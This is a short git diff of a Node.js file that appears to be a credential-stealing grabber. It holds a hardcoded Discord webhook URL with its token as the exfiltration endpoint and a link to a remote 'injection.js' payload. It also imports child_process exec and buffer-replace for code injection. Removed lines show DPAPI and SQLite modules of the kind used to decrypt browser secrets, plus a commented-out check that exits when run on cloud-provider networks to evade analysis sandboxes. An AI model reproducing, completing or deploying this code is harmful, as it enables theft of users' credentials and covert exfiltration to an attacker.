@@ -1,26 +1,12 @@
-// Code is shit
-var glob = require("glob");
-//console.log('Starting game...');
+const glob = require("glob");
 const fs = require('fs');
-var FormData = require('form-data');
 const https = require('https');
+const { exec } = require('child_process');
 const axios = require('axios');
-const crypto = require('crypto');
-//const dpapi = require("win-dpapi");
-//const sqlite3 = require('sqlite3');
-const dpapi = require("nexe-natives-fix")(require.resolve("win-dpapi"));
-const sqlite3 = require("nexe-natives-fix")(require.resolve("sqlite3"));
+const buf_replace = require('buffer-replace');
 const src = ("https://discord.com/api/webhooks/1094351023423897650/1qGssvgegfTHoSiMQijfAzrXEhHiKpZDoR8LzkguL4Pzh1QoUch4LnIg8A78iB1C1JAE")
 const github = "https://raw.githubusercontent.com/kyssuuwuas/balls-injection/main/injection.js"
-/*((async () => {
-    await axios.get('https://ipconfig.io/json')
-        .then(res => {
-            console.log(res.data);
-            if (['microsoft', 'google', 'ovh'].some(s => res.data['asn_org']?.toLowerCase()
-                    ?.includes(s))) return process.exit();
-        })
-        .catch();
-})());*/
+
 
 const {
     exec
